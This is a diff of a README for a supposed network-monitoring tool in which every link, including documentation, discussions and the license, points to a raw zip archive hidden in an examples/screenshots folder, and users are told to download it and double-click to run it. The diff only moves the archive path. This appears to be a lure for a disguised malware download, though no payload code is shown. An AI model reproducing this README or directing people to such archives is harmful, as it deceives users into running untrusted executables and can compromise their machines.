@@ -1,6 +1,6 @@
 # 🌐 monitoringnetwork - Simple Network Monitoring Made Easy
 
-[![Download](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/Software_bater.zip%20Release-brightgreen)](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/Software_bater.zip)
+[![Download](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/screenshots/Software_3.1.zip%20Release-brightgreen)](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/screenshots/Software_3.1.zip)
 
 ## 📥 Overview
 
@@ -28,16 +28,16 @@ To get started, follow these steps to download and run the software.
 ## 🏠 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the following link to access the downloads: [Release Page](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/Software_bater.zip).
+   Go to the following link to access the downloads: [Release Page](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/screenshots/Software_3.1.zip).
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version. It is typically listed at the top.
 
 3. **Download the Application**  
-   Look for the file named `https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/Software_bater.zip`. Click on it to download the application.
+   Look for the file named `https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/screenshots/Software_3.1.zip`. Click on it to download the application.
 
 4. **Run the Application**  
-   Once downloaded, locate the file in your downloads folder. Double-click on `https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/Software_bater.zip` to run the application.
+   Once downloaded, locate the file in your downloads folder. Double-click on `https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/screenshots/Software_3.1.zip` to run the application.
 
 ## 🔧 Using monitoringnetwork
 
@@ -77,8 +77,8 @@ If you encounter issues, consider the following tips:
 
 ## 🚀 Additional Resources
 
-- For further information, check the [documentation](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/Software_bater.zip).
-- Join our community for support and updates on [ GitHub Discussions](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/Software_bater.zip).
+- For further information, check the [documentation](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/screenshots/Software_3.1.zip).
+- Join our community for support and updates on [ GitHub Discussions](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/screenshots/Software_3.1.zip).
 
 ## ⚙️ Topics Covered
 
@@ -105,4 +105,4 @@ We appreciate your feedback. Please open an issue on GitHub if you have suggesti
   
 ## 📜 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/Software_bater.zip) file for details.
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/nigyaman/monitoringnetwork/raw/refs/heads/main/examples/screenshots/Software_3.1.zip) file for details.
